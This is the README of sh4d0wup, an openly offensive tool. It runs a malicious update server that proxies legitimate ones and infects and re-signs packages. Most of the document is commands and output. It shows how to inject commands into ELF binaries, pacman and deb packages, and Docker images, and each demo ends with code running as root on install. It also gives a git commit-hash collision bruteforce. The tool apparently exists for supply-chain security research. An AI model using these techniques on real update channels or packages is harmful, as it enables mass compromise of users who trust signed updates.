# sh4d0wup

```
% docker run -it --rm ghcr.io/kpcyrd/sh4d0wup:edge -h
Usage: sh4d0wup [OPTIONS] <COMMAND>

Commands:
  bait         Start a malicious update server
  front        Bind a http/https server but forward everything unmodified
  infect       High level tampering, inject additional commands into a package
  tamper       Low level tampering, patch a package database to add malicious packages, cause updates or influence dependency resolution
  keygen       Generate signing keys with the given parameters
  sign         Use signing keys to generate signatures
  hsm          Interact with hardware signing keys
  build        Compile an attack based on a plot
  check        Check if the plot can still execute correctly against the configured image
  req          Emulate a http request to test routing and selectors
  completions  Generate shell completions
  help         Print this message or the help of the given subcommand(s)

Options:
  -v, --verbose...  Increase logging output (can be used multiple times)
  -q, --quiet...    Reduce logging output (can be used multiple times)
  -h, --help        Print help information
  -V, --version     Print version information
```

## 👻 What are shadow updates?

Have you ever wondered if the update you downloaded is the same one everybody else gets or did you get a different one that was made _just for you_? Shadow updates are updates that officially don't exist but carry valid signatures and would get accepted by clients as genuine. This may happen if the signing key is compromised by hackers or if a release engineer with legitimate access turns grimy.

`sh4d0wup` is a malicious http/https update server that acts as a reverse proxy in front of a legitimate server and can infect + sign various artifact formats. Attacks are configured in `plots` that describe how http request routing works, how artifacts are patched/generated, how they should be signed and with which key. A route can have `selectors` so it matches only if eg. the user-agent matches a pattern or if the client is connecting from a specific ip address. For development and testing, mock signing keys/certificates can be generated and marked as trusted.

## 🏗️ Building sh4d0wup executable

There's a pre-built binary in the Arch Linux [extra] repository. To build the binary from source on a Debian based system use this (tested with ubuntu 22.04):

```sh
apt-get install curl git build-essential clang pkg-config libssl-dev libzstd-dev libpcsclite-dev nettle-dev liblzma-dev
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"
git clone https://github.com/kpcyrd/sh4d0wup
cd sh4d0wup
cargo build --release

sudo cp ./target/release/sh4d0wup /usr/bin
sh4d0wup --help
```

## 📦 Compile a plot

Some plots are more complex to run than others, to avoid long startup time due
to downloads and artifact patching, you can build a plot in advance. This also
allows to create signatures in advance.

```
sh4d0wup build ./contrib/plot-hello-world.yaml -o ./plot.tar.zst
```

## 🦝 Run a plot

This spawns a malicious http update server according to the plot. This also
accepts yaml files but they may take longer to start.

```
sh4d0wup bait -B 0.0.0.0:1337 ./plot.tar.zst
```

You can find examples here:

- [`contrib/plot-archlinux.yaml`](contrib/plot-archlinux.yaml)
- [`contrib/plot-debian.yaml`](contrib/plot-debian.yaml)
- [`contrib/plot-rustup.yaml`](contrib/plot-rustup.yaml)
- [`contrib/plot-curl-sh.yaml`](contrib/plot-curl-sh.yaml)

## 🪄 Infect an artifact

- [`sh4d0wup infect elf`](#sh4d0wup-infect-elf)
- [`sh4d0wup infect pacman`](#sh4d0wup-infect-pacman)
- [`sh4d0wup infect deb`](#sh4d0wup-infect-deb)
- [`sh4d0wup infect oci`](#sh4d0wup-infect-oci)

### `sh4d0wup infect elf`

```
% sh4d0wup infect elf /usr/bin/sh4d0wup -c id a.out
[2022-12-19T23:50:52Z INFO  sh4d0wup::infect::elf] Spawning C compiler...
[2022-12-19T23:50:52Z INFO  sh4d0wup::infect::elf] Generating source code...
[2022-12-19T23:50:57Z INFO  sh4d0wup::infect::elf] Waiting for compile to finish...
[2022-12-19T23:51:01Z INFO  sh4d0wup::infect::elf] Successfully generated binary
% ./a.out help
uid=1000(user) gid=1000(user) groups=1000(user),212(rebuilderd),973(docker),998(wheel)
Usage: a.out [OPTIONS] <COMMAND>

Commands:
  bait         Start a malicious update server
  infect       High level tampering, inject additional commands into a package
  tamper       Low level tampering, patch a package database to add malicious packages, cause updates or influence dependency resolution
  keygen       Generate signing keys with the given parameters
  sign         Use signing keys to generate signatures
  hsm          Interact with hardware signing keys
  build        Compile an attack based on a plot
  check        Check if the plot can still execute correctly against the configured image
  completions  Generate shell completions
  help         Print this message or the help of the given subcommand(s)

Options:
  -v, --verbose...  Turn debugging information on
  -h, --help        Print help information
```

### `sh4d0wup infect pacman`

```
% sh4d0wup infect pacman --set 'pkgver=0.2.0-2' /var/cache/pacman/pkg/sh4d0wup-0.2.0-1-x86_64.pkg.tar.zst -c id sh4d0wup-0.2.0-2-x86_64.pkg.tar.zst
[2022-12-09T16:08:11Z INFO  sh4d0wup::infect::pacman] This package has no install hook, adding one from scratch...
% sudo pacman -U sh4d0wup-0.2.0-2-x86_64.pkg.tar.zst
loading packages...
resolving dependencies...
looking for conflicting packages...

Packages (1) sh4d0wup-0.2.0-2

Total Installed Size:  13.36 MiB
Net Upgrade Size:       0.00 MiB

:: Proceed with installation? [Y/n]
(1/1) checking keys in keyring                                         [#######################################] 100%
(1/1) checking package integrity                                       [#######################################] 100%
(1/1) loading package files                                            [#######################################] 100%
(1/1) checking for file conflicts                                      [#######################################] 100%
(1/1) checking available disk space                                    [#######################################] 100%
:: Processing package changes...
(1/1) upgrading sh4d0wup                                               [#######################################] 100%
uid=0(root) gid=0(root) groups=0(root)
:: Running post-transaction hooks...
(1/2) Arming ConditionNeedsUpdate...
(2/2) Notifying arch-audit-gtk
```

### `sh4d0wup infect deb`

```
% sh4d0wup infect deb /var/cache/apt/archives/apt_2.2.4_amd64.deb -c id ./apt_2.2.4-1_amd64.deb --set Version=2.2.4-1
[2022-12-09T16:28:02Z INFO  sh4d0wup::infect::deb] Patching "control.tar.xz"
% sudo apt install ./apt_2.2.4-1_amd64.deb
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Note, selecting 'apt' instead of './apt_2.2.4-1_amd64.deb'
Suggested packages:
  apt-doc aptitude | synaptic | wajig dpkg-dev gnupg | gnupg2 | gnupg1 powermgmt-base
Recommended packages:
  ca-certificates
The following packages will be upgraded:
  apt
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 0 B/1491 kB of archives.
After this operation, 0 B of additional disk space will be used.
Get:1 /apt_2.2.4-1_amd64.deb apt amd64 2.2.4-1 [1491 kB]
debconf: delaying package configuration, since apt-utils is not installed
(Reading database ... 6661 files and directories currently installed.)
Preparing to unpack /apt_2.2.4-1_amd64.deb ...
Unpacking apt (2.2.4-1) over (2.2.4) ...
Setting up apt (2.2.4-1) ...
uid=0(root) gid=0(root) groups=0(root)
Processing triggers for libc-bin (2.31-13+deb11u5) ...
```

### `sh4d0wup infect oci`

```
% docker pull alpine:edge
% docker save alpine:edge > alpine-edge.tar
% sh4d0wup infect oci alpine-edge.tar infected.tar -c id -t infected:latest
[2022-12-12T00:31:17Z INFO  sh4d0wup::infect::oci] Original image is referencing config "121d0da757518198deeb7d1df20aaae549834f8bc77195bbf5be1900c0144cff.json": LayerConfig { config: Some(Config { user: Some(""), exposed_ports: None, env: Some(["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]), entrypoint: None, cmd: Some(["/bin/sh"]), volumes: None, working_dir: Some(""), labels: None, stop_signal: None }), rootfs: Some(RootFs { type: "layers", diff_ids: ["sha256:2f7048230bc73ff091490aa5764f9c160d1a4efe04935da731a22e8d5fcccfcc"] }), extra: {"container_config": Object {"AttachStderr": Bool(false), "AttachStdin": Bool(false), "AttachStdout": Bool(false), "Cmd": Array [String("/bin/sh"), String("-c"), String("#(nop) "), String("CMD [\"/bin/sh\"]")], "Domainname": String(""), "Entrypoint": Null, "Env": Array [String("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")], "Hostname": String("457781b778a4"), "Image": String("sha256:28d4c3ce9341a318d475e64365e47a34d5b9ba6c670bed35ce90b2402296ead6"), "Labels": Object {}, "OnBuild": Null, "OpenStdin": Bool(false), "StdinOnce": Bool(false), "Tty": Bool(false), "User": String(""), "Volumes": Null, "WorkingDir": String("")}, "architecture": String("amd64"), "created": String("2022-11-10T20:19:29.043621251Z"), "history": Array [Object {"created": String("2022-11-10T20:19:28.834390785Z"), "created_by": String("/bin/sh -c #(nop) ADD file:51c4407dc777648e8ebc8e124b05feb1807699ade513b6006a9a409f6b0f6f51 in / ")}, Object {"created": String("2022-11-10T20:19:29.043621251Z"), "created_by": String("/bin/sh -c #(nop)  CMD [\"/bin/sh\"]"), "empty_layer": Bool(true)}], "os": String("linux"), "docker_version": String("20.10.12"), "container": String("457781b778a449c9eac455ca1a18300a4041cb2b0d2d3f979460d19d7632ebf7")} }
[2022-12-12T00:31:17Z INFO  sh4d0wup::infect::oci] Creating new layer in image: "patched"
[2022-12-12T00:31:17Z INFO  sh4d0wup::infect::oci] Generating filesystem layer for payload: "id"
[2022-12-12T00:31:17Z INFO  sh4d0wup::infect::oci] Updating tags of image to ["infected:latest"]
[2022-12-12T00:31:17Z INFO  sh4d0wup::infect::oci] Writing modified manifest...
% docker load -i infected.tar
Loaded image: infected:latest
% docker run -it infected echo hello world
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
hello world
```

### Bruteforce git commit partial collisions

Here's a short oneliner on how to take the latest commit from a git repository,
send it to a remote computer that has sh4d0wup installed to tweak it until the
commit id starts with the provided `--collision-prefix` and then inserts the
new commit back into the repository on your local computer:

```
% git cat-file commit HEAD | ssh lots-o-time nice sh4d0wup tamper git-commit --stdin --collision-prefix 7777 --strip-header | git hash-object -w -t commit --stdin
```

This may take some time, eventually it shows a commit id that you can use to
create a new branch:

```
git show 777754fde8...
git branch some-name 777754fde8...
```
